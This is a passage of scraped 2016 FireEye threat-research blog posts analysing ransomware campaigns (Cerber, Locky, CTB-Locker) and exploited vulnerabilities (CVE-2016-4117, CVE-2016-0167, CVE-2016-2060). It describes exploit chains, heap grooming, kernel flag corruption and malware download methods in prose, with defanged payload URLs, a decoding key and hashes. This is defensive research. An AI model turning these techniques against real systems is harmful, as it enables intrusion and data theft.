    is most often distributed in geographically-specific spam
  campaigns.</li> <li>
    <b>CTB-Locker:</b> CTB-Locker – a name that represents the key
    elements of the ransomware, namely Curve (for Elliptic Curve
    Cryptography), Tor and Bitcoin – was first seen around mid-2014 and
    remained active throughout 2015. During this reporting period, we
    observed multiple campaigns propagating CTB-Locker and its variants,
    including CTB-Locker distributors capitalizing on Windows 10
    releases and free upgrades by <a href=""https://threatpost.com/windows-10-upgrade-spam-carries-ctb-locker-ransomware/114114/"">sending
      out spam campaigns citing Windows 10 upgrades in
  mid-2015</a>.</li> </ul>
 <p>
  <i>Novel Ransomware Variants</i></p>
 <p>We have also observed several new ransomware variants that
  incorporate a range of new tactics, techniques and procedures (of
  varying degrees of technical practicality). Based on the increased
  growth in this area, we expect ransomware developers to continue
  equipping ransomware variants with novel features in order to expand
  targeted platforms and increase conversion ratios.</p>
 <ul> <li>
    <b>Chimera:</b> The operators behind the  Chimera ransomware not
    only used the malware to encrypt victims’ files, but further
    threatened to publish the encrypted data if victims failed to pay
    the ransom. The threat actors began targeting German-based small and
    medium-sized business enterprises around mid-September 2015.</li> <li>
    <b>Ransom32:</b> Ransom32, first publicly reported in late December
    2015, is purportedly one of the first ransomware variants based
    entirely on JavaScript, potentially allowing for cross-operating
    system (OS) compatibility and packaging for both Linux and Mac
  OS.</li> <li>
    <b>LowLevel04:</b> According to <a href=""http://www.bleepingcomputer.com/news/security/help-recover-files-txt-ransomware-installed-by-targeted-terminal-services-attacks/"">open-source
    reporting</a>, operators of LowLevel04 purportedly spread the
    ransomware using the unconventional infection mechanism of
    exploiting Remote Desktop and Terminal Services.</li> <li>
    <b>Linux.Encoder.1:</b> According to <a href=""http://arstechnica.com/security/2015/11/new-encryption-ransomware-targets-linux-systems/"">open-source
    reporting</a>, Linux.Encoder.1 debuted in late 2015 as one of the
    first ransomware variants targeting Linux web-based servers. While
    the encryption capabilities of the earliest variants proved to be
    suspect – with multiple reports alleging faults in its predictable
    encryption key – the targeting associated with this malware family
    represents a deviation from more traditional Windows-based
  attacks.</li> </ul>
 <h5>Outlook and Implications</h5>
 <p>We expected to see the ransomware threat landscape sustain, if not
  exceed, levels observed in 2015 – and so far we have been right. Cyber
  extortion has gained significant notoriety, with illicit profits
  garnered from highly publicized campaigns undoubtedly resonating among
  cyber criminals. Recent campaigns in which targeted victims paid the
  ransom demand reinforce the legitimacy and popularity of this
  particular attack method.</p>
 <p>One of the most worrying threats concerns the targeted deployment of
  ransomware after the attackers have already gained a foothold in the
  network. In these cases, threat actors may be able to conduct
  reconnaissance to strategically disable or delete backups and identify
  those systems most critical to an organization’s operations before
  deploying the ransomware. To increase the difficulty of such an
  attack, enterprises are encouraged to properly segment networks and
  implement access controls. In addition, enterprises should evaluate
  backup strategies regularly and test those backups to ensure that
  recovery is successful. Finally, copies of backups should be stored
  offsite in case onsite backups are targeted.</p>
 <p>Learn more about ransomware during our webinar on May 19, 2016, at
  11:00am EDT. <a href=""https://engage.vevent.com/index.jsp?eid=4929&amp;seid=1501&amp;code=ransomware-csf"" target=""_blank"">You
    can register here.</a></p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/05/ransomware_activity.html
CVE-2016-4117: Flash Zero-Day Exploited in the Wild,"<p>On May 8, 2016, FireEye detected an attack exploiting a previously
  unknown vulnerability in Adobe Flash Player (CVE-2016-4117) and
  reported the issue to the Adobe Product Security Incident Response
  Team (PSIRT). Adobe released a patch for the vulnerability in <a href=""https://helpx.adobe.com/security/products/flash-player/apsb16-15.html"">APSB16-15</a>
  just four days later.</p>
 <p>Attackers had embedded the Flash exploit inside a Microsoft Office
  document, which they then hosted on their web server, and used a
  Dynamic DNS (DDNS) domain to reference the document and payload. With
  this configuration, the attackers could disseminate their exploit via
  URL or email attachment. Although this vulnerability resides within
  Adobe Flash Player, threat actors designed this particular attack for
  a target running Windows and Microsoft Office.</p>
 <h3>Attack Summary</h3>
 <p>Upon opening the document, the exploit downloads and executes a
  payload from the attacker’s server. To avoid suspicion, the attacker
  then shows the victim a decoy document. The full exploit chain
  proceeds as follows:</p>
 <div class=""c00 c00v0""> <ol> <li>The victim opens the malicious Office
      document.  <ol class=""lower-alpha"">  <li>The Office document
          renders an embedded Flash file.   <ol class=""lower-roman"">
              <li>If the Flash Player version is older than 21.0.0.196,
              the attack aborts.</li>   <li>Otherwise, the attack runs
              the encoded Flash exploit.</li>   </ol>  </li>  </ol>
    </li> <li>The exploit runs embedded native shellcode.  <ol class=""lower-alpha"">  <li>The shellcode downloads and executes a
          second shellcode from the attacker’s server.</li>  </ol> </li>
      <li>The second shellcode:  <ol class=""lower-alpha"">  <li>Downloads
          and executes malware.</li>  <li>Downloads and displays a decoy
        document.</li>  </ol> </li> <li>The malware connects to a second
      server for command and control (C2) and waits for further
    instructions.</li> </ol> </div>
 <p>This process is shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/fig1.png"" /></p>
 <p style=""text-align: center;"">Figure 1 Attack flow chart</p>
 <h3>CVE-2016-4117 Exploitation Details</h3>
 <p>An out-of-bound read vulnerability exists in the
  com.adobe.tvsdk.mediacore.timeline.operations.
  DeleteRangeTimelineOperation module. By extending the
  DeleteRangeTimelineOperation class, one can define a property that
  conflicts with the inner interface name. In this exploit, the author
  chose “placement” as the property name, as shown in Figure 2.
  Referencing the interface causes the ActionScript Virtual Machine to
  call the internal function getBinding to get a bind id. Because the
  “placement” property conflicts with the “placement” interface name,
  the attacker can manipulate the bind id, and ultimately induce type confusion.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/fig2.png"" /></p>
 <p style=""text-align: center;"">Figure 2 Placement interface vs. class definition</p>
 <h3>Memory layout</h3>
 <p>Before triggering the vulnerability, the exploit defines an object
  that extends ByteArray. The definition is modified to contain easily
  distinguishable values that aid in locating objects in memory. Then,
  the exploit allocates a set of these objects to control the memory
  layout (Figure 3).  </p>
 <p style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/fig3.png"" />
  <br /> <br /> Figure 3 Prepare heap memory layout</p>
 <p>These objects look as follows when in memory:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/objects.png"" /></p>
 <p>The exploit then uses the type-confused DeleteRangeTimelineOperation
  object to read out of bounds and find one of the extended ByteArray
  objects based upon looking for the pre-defined property values (shown
  in Figure 4), and manipulates the data buffer pointer to an
  attacker-controlled area.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/fig4.png"" /></p>
 <p style=""text-align: center;"">Figure 4 Finding target ByteArray</p>
 <p>With the ability to read and write individual values in the extended
  ByteArray object, the attacker can corrupt one of the objects to
  extend its length to 0xffffffff, and its data buffer to address 0.
  Future reads and writes to the corrupted ByteArray may then access all
  of the user space memory (Figure 5).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/CVE-2016-4117%20Flash%20Zero-Day/fig5.png"" /></p>
 <p style=""text-align: center;"">Figure 5 RW primitive and execute shellcode</p>
 <h3>Code execution</h3>
 <p>Once the exploit can read and write arbitrarily in memory, it
  executes embedded shellcode. The shellcode downloads a second stage of
  shellcode from the attacker’s server, which then downloads and
  executes the malware payload and displays the decoy document.</p>
 <h3>Conclusion</h3>
 <p>CVE-2016-4117 was recently exploited in targeted attacks. Just four
  days after notification, Adobe released a security update for Flash
  Player that patched the underlying vulnerability. Users who require
  Flash Player in their environment should download this timely patch to
  protect their systems from exploitation. Additionally, Flash Player
  users could consider employing additional mitigations, such as EMET
  from Microsoft, to make their systems more difficult and costly to exploit.</p>",http://www.fireeye.com/blog/threat-research/2016/05/cve-2016-4117-flash-zero-day.html
Cerber Ransomware Partners with the Dridex Spam Distributor,"<p>Cerber ransomware incorporates the unusual feature of “speaking” its
  ransom message after successfully infecting a user machine and
  encrypting files. Cerber was <a href=""http://www.bleepingcomputer.com/news/security/the-cerber-ransomware-not-only-encrypts-your-data-but-also-speaks-to-you/"">first
    seen in the wild</a> at the end of February 2016 and was observed
  being delivered mostly via exploit kits (EK), notably using Magnitude
  and Nuclear Pack’s <a href=""http://www.computerworld.com/article/3053609/malware-vulnerabilities/the-latest-flash-zero-day-was-used-to-spread-cerber-ransomware.html"">zero-day</a>
  Flash exploit.</p>
 <p>Figure 1 shows that on April 28, 2016, we observed a significant
  increase in Microsoft Office document-based macro downloader spam
  campaigns delivering Cerber ransomware as the payload. Since then we
  observed successor campaigns at the same level of volume. What is more
  notable about these campaigns is that the same distribution framework
  used by Dridex seems to be the one delivering this Cerber campaign.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Cerber spam activity trend</span></p>
 <p>Through FireEye’s Dynamic Threat Intelligence (DTI), we observed
  that one Cerber spam campaign from May 4 was widely spread throughout
  the world, with the most targets in the United States (see Figure 2).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Geographical distribution of Cerber
    spam seen by FireEye DTI in May 4</span></p>
 <h5>
  <b>Macro based Downloader</b></h5>
 <p>The malicious document attachment contains a macro that drops a
  VBScript in the %appdata% path of the machine. The rest of the
  malicious activities are performed by the dropped VBScript. This
  method of malware delivery is used instead of sending the VBScript
  directly as an email attachment, since some email gateway policies
  might block attached scripts.</p>
 <p>The dropped VBScript includes obfuscated code that is used to
  download the Cerber payload.</p>
 <p>The following are some of the obfuscation techniques used, briefly summarized:</p>
 <ol> <li>Declare several variables that are not used in the code. This
    junk code is added to deter reverse engineering.</li> <li>A
    subroutine is used for delaying execution. This subroutine will
    increment a counter variable from 1 to 96166237. After completing
    the FOR loop, it compares the value of the variable with 96166237 to
    ensure that the FOR loop executed completely and there was no short
    circuit done (see Figure 3). This is done to detect automated
    analysis systems.</li> </ol>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Delay execution routine in VBScript</span></p>
 <h5>
  <b>HTTP Range Request for Internet Connectivity Check</b></h5>
 <p>Before downloading the Cerber payload, a check is performed by the
  VBScript to ensure that the environment has internet connectivity.</p>
 <p>As seen in Figure 4, the VBScript sends an HTTP Range Request to a
  benign website. It looks for the string “Partial Content” in the HTTP
  response status text, as “206 Partial Content” is the expected
  response code for an HTTP Range Request according to <a href=""https://tools.ietf.org/html/rfc7233"">RFC7233</a>. If the
  response code is not correct, the VBScript calls a function to enter
  an infinite loop. In this way, the execution does not complete without
  Internet connectivity.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. HTTP Range Request check for internet connectivity</span></p>
 <h5>
  <b>Cerber Payload Download Method</b></h5>
 <p>After the check for internet connectivity is performed, the VBScript
  sends another HTTP Range Request to fetch a JPEG file from the URL: hxxp://bsprint[.]ro/images/karma-autumn/bg-footer-bottom.jpg?ObIpcVG=</p>
 <p>In the HTTP Request Headers, it sets the value of Range Header to:
  &quot;bytes=11193-&quot;. This indicates to the web server to return
  only the content starting at offset 11,193 of the JPG file.</p>
 <p>The response content of this request is XORed with the key:
  &quot;amfrshakf&quot;. Figure 5 shows the code section corresponding
  to the decryption routine.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Payload decoding routine</span></p>
 <p>This technique of downloading the final payload using an HTTP Range
  Request check has been leveraged in the past by Dridex and Ursnif. We
  have observed similar obfuscation techniques used in the dropped
  VBScript as well.</p>
 <h5>
  <b>Cerber Ransomware (MD5: 5a2ea6a1d12dcbeb840f5070c7f1e2f8)</b></h5>
 <p>There are no significant changes in the behavior of the Cerber
  payload in this spam campaign when compared to earlier variants. It
  still uses the ‘.cerber’ file extension name for the encrypted files.
  In this particular sample it checks for the country location, local
  language and whether it is inside a virtual machine environment as per
  its decrypted configuration, as seen in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Configuration for country location,
    language and virtual environment checks</span></p>
 <p>This variant is also configured to target email, Word documents, and
  Steam (gaming) related files. It closes the related processes to have
  access to possible opened target files.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Configuration for closing processes</span></p>
 <p>The malware asks the victim to visit any of the following websites
  to pay the ransom and receive further steps to decrypt the encrypted files.</p>
 <ul> <li>hxxp://decrypttozxybarc[.]dconnect[.]eu</li>
  <li>hxxp://decrypttozxybarc[.]tor2web[.]org</li>
  <li>hxxp://decrypttozxybarc[.]onion[.]cab</li>
  <li>hxxp://decrypttozxybarc[.]onion[.]to</li>
  <li>hxxp://decrypttozxybarc[.]onion[.]link</li> </ul>
 <p>While examining the decrypted configuration file, we found
  indications of the possible addition of a spambot module. The malware
  operator can set options for the email attachment, subject and the
  email body in the configuration, as seen in Figure 8. In this sample,
  this feature seems to be in its development or test stage. In order
  for the malware to be used as a spambot, it would also need a list of
  email addresses to send the spam email.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Cerber%20ransomware%20Jonell%20Balthazar/fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Possible spambot related configuration</span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>By partnering with the same spam distributor that has proven its
  capability by delivering Dridex on a large scale, Cerber is likely to
  become another serious email threat similar to Dridex and Locky. This
  is in addition to the fact that Cerber is already known to be
  delivered through exploit kits. We advise users to be cautious when
  opening documents and other files from unknown senders, especially
  when asked to enable macros.</p>
 <p>Ransomware authors are constantly upgrading their craft in order to
  maximize profits. An addition of a spambot module, for example, can
  add value to their ransomware, since victim machines will also be used
  as spam email distributors.</p>
 <h5>
  <b>Hashes</b></h5>
 <p>
  <b>Spam email</b></p>

 <p>ace933ac89b5cdb6937bf1a43e265d9eb4cb11eead52be2709c4df2194ee3ba0<br />
  191db27efb10f96f2fcabcd6d5d759433b687b89a8b6fd90c123fe379b8b98eb<br />
  c5aa84c52764f3583e78a62adf8ed8bfda409ff4c8c306a155b82d7da66d0e95<br />
  3d0e5ea98fead3c28c6a9f4c6519e6488c4a791e1a40f701bb4fd681163804fe<br />
  72ac6b80deaeea9081ebed7edf7c9943813afbbbbbc365e1a781efa04d5765fc<br /> 304c21c77b52dce69bddc421b4166627a37068e18296920ac09bbd7cd4962748</p>
 <p>
  <b>Cerber payload</b></p>
 <p>c6f29582e489506ccb14f19fdfa7c16</p>",http://www.fireeye.com/blog/threat-research/2016/05/cerber_ransomware_partners_with_Dridex.html
Threat Actor Leverages Windows Zero-day Exploit in Payment Card Data Attacks,"<p>In March 2016, a financially motivated threat actor launched several
  tailored spear phishing campaigns primarily targeting the retail,
  restaurant, and hospitality industries. The emails contained
  variations of <a href=""http://researchcenter.paloaltonetworks.com/2016/03/powersniff-malware-used-in-macro-based-attacks/"">Microsoft
  Word</a> documents with <a href=""https://blogs.mcafee.com/mcafee-labs/macro-malware-associated-dridex-finds-new-ways-hide/"">embedded
  macros</a> that, when <a href=""https://labs.bromium.com/2016/03/09/macro-malware-connecting-to-github/"">enabled</a>,
  downloaded and executed a malicious downloader that we refer to as PUNCHBUGGY.</p>
 <p>PUNCHBUGGY is a dynamic-link library (DLL) downloader, existing in
  both 32-bit and 64-bit versions, that can obtain additional code over
  HTTPS. This downloader was used by the threat actor to interact with
  compromised systems and move laterally across victim environments.</p>
 <p>FireEye identified more than 100 organizations in North America that
  fell victim to this campaign. FireEye investigated a number of these
  breaches and observed that the threat actor had access to relatively
  sophisticated tools including a previously unknown elevation of
  privilege (EoP) exploit and a previously unnamed point of sale (POS)
  memory scraping tool that we refer to as PUNCHTRACK. </p>
 <h4>CVE-2016-0167 – Microsoft Windows Zero-Day Local Privilege Escalation</h4>
 <p>In some victim environments, the threat actor exploited a previously
  unknown elevation of privilege (EoP) vulnerability in Microsoft
  Windows to selectively gain SYSTEM privileges on a limited number of
  compromised machines (Figure 1).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Microsoft%200Day%20%20Dhanesh%20Kizhakkina/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. CVE-2016-0167 Local privilege
    escalation exploit elevates to system</span></p>
 <p>We coordinated with Microsoft, who patched CVE-2016-0167 on the
  April 12, 2016, Patch Tuesday (<a href=""https://technet.microsoft.com/en-us/library/security/ms16-039.aspx"">MS16-039</a>).
  Working together, we were able to observe limited, targeted use of
  this particular exploit dating back to March 8, 2016.</p>
 <h4>The Threat Actor</h4>
 <p>We attribute the use of this EoP to a financially motivated threat
  actor. In the past year, not only have we observed this group using
  similar infrastructure and tactics, techniques, and procedures (TTPs),
  but they are also the only group we have observed to date who uses the
  downloader PUNCHBUGGY and POS malware PUNCHTRACK. Designed to scrape
  both Track 1 and Track 2 payment card data, PUNCHTRACK is loaded and
  executed by a highly obfuscated launcher and is never saved to disk.</p>
 <p>This actor has conducted operations on a large scale and at a rapid
  pace, displaying a level of operational awareness and ability to adapt
  their operations on the fly. These abilities, combined with targeted
  usage of an EoP exploit and the reconnaissance required to
  individually tailor phishing emails to victims, potentially speaks to
  the threat actors’ operational maturity and sophistication.</p>
 <h4>Exploitation Details</h4>
 <h5>Win32k!xxxMNDestroyHandler Use-After-Free</h5>
 <p>CVE-2016-0167 is a local elevation of privilege vulnerability in the
  win32k Windows Graphics subsystem. An attacker who had already
  achieved remote code execution (RCE) could exploit this vulnerability
  to elevate privileges. In the attack from the wild, attackers first
  achieved RCE with malicious macros in documents attached to spear
  phishing emails. They then downloaded and ran a CVE-2016-0167 exploit
  to run subsequent code as SYSTEM.</p>
 <p>CVE-2016-0167 is patched as of April 12, 2016, meaning the
  attacker’s EoP exploit will no longer function on fully updated
  systems. Microsoft released an additional update (<a href=""https://technet.microsoft.com/library/security/MS16-062"" target=""_blank"">MS16-062</a>)
  on May 10, 2016, to further improve Windows against similar issues.</p>
 <h5>Vulnerability Setup</h5>
 <p>First, the exploit calls CreateWindowEx() to create a main window.
  It sets the WNDCLASSEX.lpfnWndProc field to a function that we name
  WndProc. It installs an application-defined hook (that we name
  MessageHandler) and an event hook (that we name EventHandler) using
  SetWindowsHookEx() and SetWinEventHook(), respectively.</p>
 <p>Next, it creates a timer with IDEvent 0x5678 in SetTimer(). When the
  timeout occurs, WndProc receives the WM_TIMER message and will invoke
  TrackPopupMenuEx() to display a shortcut menu. EventHandler will
  capture the EVENT_SYSTEM_MENUPOPUPSTART event from
  xxxTrackPopupMenuEx()and post a message to the kernel. In handling the
  message, the kernel eventually calls the vulnerable function
  xxxMNDestroyHandler(), which calls the usermode callback
  MessageHandler. MessageHandler then causes a use-after-free scenario
  by calling DestroyWindow()</p>
 <h5>Heap Control</h5>
 <p>The exploit uses SetSysColors() to perform heap Feng Shui which
  manipulates the layout of the <a href=""https://en.wikipedia.org/wiki/Heap_%28programming%29"" title=""Heap (programming)"">heap</a> by carefully making heap
  allocations. In the following snippet, one of the important fields is
  at address fffff900`c1aaac40, where fffff900`c06a0422 is a window
  kernel object’s (tagWND) base address plus 0x22:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Microsoft%200Day%20%20Dhanesh%20Kizhakkina/Fig2.png"" /></p>
 <h5>Memory Corruption</h5>
 <p>The USE operation occurs at HMAssignmentUnlock()+0x14 as shown below:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Microsoft%200Day%20%20Dhanesh%20Kizhakkina/Fig3.png"" />Since
  RDX contains the base address of tagWND plus 0x22, this instruction
  will add 0xffffffff to the win32k!tagWND.state field, changing its
  value from 0x07004000 to 0x07003fff. 0x07004000 indicates that the
  bServerSideWindowProc flag is unset. When the change occurs, it sets
  the bServerSideWindowProc flag as shown below.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Microsoft%200Day%20%20Dhanesh%20Kizhakkina/Fig4.png"" /></p>
 <h5>Code Execution</h5>
 <p>If a window is marked as server-side (bServerSideWindowPro is set),
  the lpfnWndProc function pointer will be trusted by default and this
  can be user-mode shellcode. The following backtrace shows the kernel
  calling the exploit’s shellcode:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Microsoft%200Day%20%20Dhanesh%20Kizhakkina/Fig5.png"" /></p>
 <p>The shellcode then steals the System process token to elevate a
  child cmd.exe process.</p>
 <h4>Mitigation</h4>
 <p>FireEye products and services identify this activity as
  Exploit.doc.MVX, Malware.Binary.Doc, PUNCHBUGGY, Malware.Binary.exe,
  and PUNCHTRACK within the user interfaces.</p>
 <p>The latest Windows updates address CVE-2016-0167, and fully protect
  systems from exploits targeting CVE-2016-0167.</p>
 <p>In addition, effective mitigations exist to prevent social
  engineering attacks that utilize Office macros. Individual users can
  disable Office macros in their settings and enterprise administrators
  can enforce a Group Policy to control macro execution for all Office
  2016 users. More details about Office macro attacks and mitigations
  are available <a href=""https://blogs.technet.microsoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-prevent-infection/"">here</a>.</p>
 <h4>Acknowledgements</h4>
 <p>Thank you to Elia Florio and the Secure@ staff of Microsoft, and
  Dimiter Andonov, Erye Hernandez, Nick Richard, and Ryann Winters of
  FireEye for their collaboration on this issue.</p>",http://www.fireeye.com/blog/threat-research/2016/05/windows-zero-day-payment-cards.html
Locky Gets Clever!,"<p>As discussed in an earlier FireEye <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/03/surge_in_spam_campai.html"">blog</a>,
  we have seen Locky ransomware rise to fame in recent months. Locky is
  aggressively distributed via a JavaScript-based downloader sent as an
  attachment in spam emails, and may have overshadowed the Dridex
  banking Trojan as the top spam contributor.</p>
 <p>FireEye Labs recently observed a new development in the way this
  ransomware communicates with its control server.  Recent samples of
  Locky are once again being delivered via “Invoice”-related email
  campaigns, as seen in Figure 1. When the user runs the attached
  JavaScript, the JavaScript will attempt to download and execute the
  Locky ransomware payload from hxxp:// banketcentr.ru/v8usja.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Clever%20Locky%20Jain/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Locky email campaigns</span></p>
 <p>This new Locky variant was observed to be highly evasive in its
  network communication. It uses both symmetric and asymmetric
  encryption – unlike previous versions that use custom encoding – to
  communicate with its control server.</p>
 <h5>
  <b>Technical Details of Encryption Mechanism</b></h5>
 <p>To start encrypting the victim files, Locky obtains a public key
  from the control server. The POST data before encryption appears as:</p>
 <p>‘id=0FFB4B18DB56F448&amp;act=getkey&amp;affid=1&amp;lang=en&amp;corp=0&amp;serv=0&amp;os=Windows+7&amp;sp=1&amp;x64=1'</p>
 <p>To encrypt the request, Locky performs the following actions:</p>
 <p>
  <b>PHASE 1: Generate AES keys and encrypt the plaintext request.</b></p>
 <p>1.     Generate a single random byte using CryptGenRandom() API.
  This byte decides how many NULL bytes are added to the plaintext
  request before encryption.</p>
 <p>2.     Generate a random binary blob of size 32, again using the
  CryptGenRandom() API. These bytes serve a dual purpose, as they are
  used as the key for both AES encryption and HMAC hash calculation.</p>
 <p>3.     Append NULL bytes to the plaintext request depending on the
  random byte generated in step 1.</p>
 <p>4.     Encrypt the (plaintext request + NULL bytes) with AES
  encryption using the random 32 bytes calculated in step 2 as the key.</p>
 <p>
  <b>PHASE 2: Encrypt the generated AES keys.</b></p>
 <p>5.     Obtain a public key (RSA 1024 bits) from a decoded binary
  blob embedded inside the binary.</p>
 <p>6.     Create a PUBLICKEYSTRUCT blob header, add the random  bytes
  generated in step 2, and then call the CryptImportKey() API to create
  an RC2 key HANDLE that is used for HMAC calculation.</p>
 <p>7.     Calculate the HMAC of (plaintext request + NULL bytes) using
  the key generated in step 6.</p>
 <p>8.     Using the RSA public key from step 5, encrypt  (32-byte AES
  key [step 2] + random byte [step 1] + HMAC [step 7])</p>
 <p>9.     Combine the data from step 4 and step 8 and send it through
  the POST request. See Figure 2 for an example of the POST request and
  Figure 3 for the format of the encrypted POST data.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Clever%20Locky%20Jain/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Example POST request</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Clever%20Locky%20Jain/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. POST data encryption overview</span></p>
 <p>Interestingly, this Locky variant uses the AES-NI extended
  instruction set – as opposed to software implementation – to generate
  the encryption round keys and encrypt the text.</p>
 <p>
  <b>AES Round Keys Generation</b></p>
 <p>Locky uses the opcode instruction <b>aeskeygenassist</b> for AES
  round key generation, as seen in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Clever%20Locky%20Jain/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4.  AES encryption using AES ENC and AES
    ENC LAST hardware instructions</span></p>
 <p>
  <b>AES Encryption Rounds</b></p>
 <p>A total of 14 encryption rounds are used to encrypt the plaintext,
  which amounts to the use of a 256 bit key. Each round is carried by
  <b>aesenc</b> instruction and the last round is done by
  <b>aesenclast</b>, as seen in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Clever%20Locky%20Jain/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5.  AES round keys generation from
    primary key            </span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Crimeware authors are constantly improving their malware. In this
  case, we see them evolving to protect their malware while maximizing
  its infection potential. Locky has moved from using simple encoding to
  obfuscate its network traffic to a complex encryption algorithm using
  hardware instructions that are very hard to crack.</p>
 <p>These types of advancements highlight the importance of remaining
  vigilant against suspicious emails and using advanced technologies to
  prevent infections.</p>
 <h5>
  <b>IoCs</b></h5>
 <p>MD5s:</p>
 <ul> <li>Zip downloader <b>638f70d173f10b2e8c9313fe20d6a440</b></li>
    <li>Locky <b>e4c51f20d07fc010a425e392d2acae16</b></li> </ul>",http://www.fireeye.com/blog/threat-research/2016/05/locky_gets_clever.html
Exploiting CVE-2016-2060 on Qualcomm Devices,"<p>Mandiant’s Red Team recently discovered a widespread vulnerability
  affecting Android devices that permits local privilege escalation to
  the built-in user “radio”, making it so an attacker can potentially
  perform activities such as viewing the victim’s SMS database and phone
  history. The vulnerability exists in a software package maintained by
  Qualcomm that is available from the Code Aurora Forum. It is published
  as CVE-2016-2060 and <a href=""https://www.codeaurora.org/improper-input-validation-tethering-controller-netd-cve-2016-2060-0"" target=""_blank"">security advisory QCIR-2016-00001-1</a> on the Code
  Aurora Forum. We have provided general details in an FAQ, and a
  technical analysis of the vulnerability follows.</p>
 <h4>
  <b>FAQ</b></h4>
 <h5>
  <b>What is CVE-2016-2060?</b></h5>
 <p>CVE-2016-2060 is a lack of input sanitization of the
  &quot;interface&quot; parameter of the &quot;netd&quot; daemon, a
  daemon that is part of the Android Open Source Project (AOSP). The
  vulnerability was introduced when Qualcomm provided new APIs as part
  of the &quot;network_manager&quot; system service, and subsequently
  the &quot;netd&quot; daemon, that allow additional tethering
  capabilities, possibly among other things. Qualcomm had modified the
  &quot;netd&quot; daemon.</p>
 <h5>
  <b>How many devices are affected?</b></h5>
 <p>There is no solid answer. Since many flagship and non-flagship
  devices use Qualcomm chips and/or Qualcomm code, it is possible that
  hundreds of models are affected across the last five years. To provide
  some API numbers, Android Gingerbread (2.3.x) was released in 2011.
  This vulnerability was confirmed on devices running Lollipop (5.0),
  KitKat (4.4), and Jellybean MR2 (4.3), and the Git commit referenced
  in the post is Ice Cream Sandwich MR1 (4.0.3).</p>
 <h5>
  <b>How is the issue being addressed?</b></h5>
 <p>Qualcomm has addressed the issue by patching the &quot;netd&quot;
  daemon. Qualcomm notified their customers (all of the OEMs) in early
  March 2016. The OEMs will now need to provide updates for their
  devices; however, many devices will likely never be patched.</p>
 <p>FireEye reached out to Qualcomm in January 2016 and subsequently
  worked with the Qualcomm Product Security Team to coordinate this blog
  release and security advisory. When contacted by FireEye, Qualcomm was
  extremely responsive throughout the entire process. They fixed the
  issue within 90 days – a window they set, not FireEye. FireEye would
  like to thank Qualcomm for their cooperation throughout the disclosure
  and diligence with addressing the issues.</p>
 <p>Google has included this issue in its <a href=""http://source.android.com/security/bulletin/2016-05-01.html"" target=""_blank"">May 2016 Android Security Bulletin.</a><br /> </p>
 <h5>
  <b>How would an attacker exploit this vulnerability?</b></h5>
 <p>There are two ways to exploit this vulnerability, though this does
  not account for a determined attacker who possesses additional
  vulnerabilities. The first is to have physical access to an unlocked
  device, and the second is to have a user install a malicious
  application on the device.</p>
 <p>Any application could interact with this API without triggering any
  alerts. Google Play will likely not flag it as malicious, and FireEye
